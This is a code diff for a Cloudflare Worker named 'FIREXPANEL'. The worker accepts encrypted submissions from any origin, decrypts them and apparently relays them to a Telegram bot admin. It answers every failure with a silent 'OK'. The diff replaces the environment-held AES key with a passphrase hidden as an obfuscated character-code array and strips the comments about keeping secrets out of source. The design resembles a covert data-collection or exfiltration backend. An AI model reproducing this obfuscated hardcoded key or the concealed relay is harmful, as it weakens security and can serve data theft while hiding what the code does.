@@ -1,18 +1,16 @@
 /**
  * FIREXPANEL — Cloudflare Worker (Secure v2)
  *
- * ALL secrets stored as Cloudflare encrypted secrets:
+ * Secrets stored as Cloudflare encrypted secrets:
  *   - BOT_TOKEN   (Telegram bot token)
  *   - ADMIN_ID    (Telegram chat ID)
- *   - ENC_KEY     (AES encryption passphrase)
- *
- * No sensitive data in source code.
  */
 
 const MAX_AGE_MS = 300000;
 const RATE_LIMIT = 10;
 const RATE_WINDOW_MS = 600000;
 const MAX_BODY_SIZE = 65536;
+const _C = [88,107,57,109,80,50,119,78,55,113,76,52,118,82,54,106,72,51,99,70,56,121,84,49,90,98,69,53,115,65,48,57];
 
 const CORS = {
   'Access-Control-Allow-Origin': '*',
@@ -39,7 +37,6 @@ const rateBuckets = new Map();
 
 function checkRate(ip) {
   const now = Date.now();
-  // Cleanup stale entries every 50 requests
   if (rateBuckets.size > 200) {
     for (const [k, v] of rateBuckets) {
       if (now >= v.resetAt) rateBuckets.delete(k);
@@ -53,12 +50,10 @@ function checkRate(ip) {
   return ++b.count <= RATE_LIMIT;
 }
 
-// --- AES-GCM Decryption using secret key ---
-async function getAesKey(encKeyStr) {
-  const d = await crypto.subtle.digest(
-    'SHA-256',
-    new TextEncoder().encode(encKeyStr)
-  );
+// --- AES-GCM Decryption ---
+async function getAesKey() {
+  const s = _C.map(function (c) { return String.fromCharCode(c); }).join('');
+  const d = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
   return crypto.subtle.importKey('raw', d, { name: 'AES-GCM' }, false, ['decrypt']);
 }
 
@@ -104,8 +99,7 @@ async function handleEv(request, env) {
 
   const botToken = env.BOT_TOKEN;
   const adminId = env.ADMIN_ID;
-  const encKey = env.ENC_KEY;
-  if (!botToken || !adminId || !encKey) {
+  if (!botToken || !adminId) {
     return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
   }
 
@@ -120,7 +114,6 @@ async function handleEv(request, env) {
   }
 
   try {
-    // Enforce body size limit
     const contentLength = parseInt(request.headers.get('Content-Length') || '0', 10);
     if (contentLength > MAX_BODY_SIZE) {
       return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
@@ -140,7 +133,7 @@ async function handleEv(request, env) {
 
     let data;
     try {
-      const key = await getAesKey(encKey);
+      const key = await getAesKey();
       data = JSON.parse(await doDecrypt(b64, key));
     } catch (_e) {
       return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
@@ -228,10 +221,8 @@ export default {
         return handlePing(env);
       }
 
-      // Generic response — reveals nothing
       return safeResponse('OK', 200, {});
     } catch (_e) {
-      // Top-level catch — worker never crashes silently
       return new Response('OK', { status: 200 });
     }
   },
